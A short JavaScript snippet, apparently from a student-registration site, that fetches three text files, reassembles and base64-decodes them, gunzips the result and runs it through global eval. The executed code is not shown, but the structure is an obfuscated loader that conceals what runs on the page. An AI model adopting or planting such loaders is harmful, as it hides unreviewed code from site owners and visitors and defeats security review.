(function(){
  var files=["/js/_asr_gz_0.txt","/js/_asr_gz_1.txt","/js/_asr_gz_2.txt"];
  Promise.all(files.map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(parts){
    var b64=parts.join("");
    var bin=atob(b64);
    var bytes=new Uint8Array(bin.length);
    for(var i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
    var ds=new DecompressionStream("gzip");
    var stream=new Blob([bytes]).stream().pipeThrough(ds);
    return new Response(stream).text();
  }).then(function(text){ (0,eval)(text); })
  .catch(function(e){ console.error("[students-reg]",e); });
})();
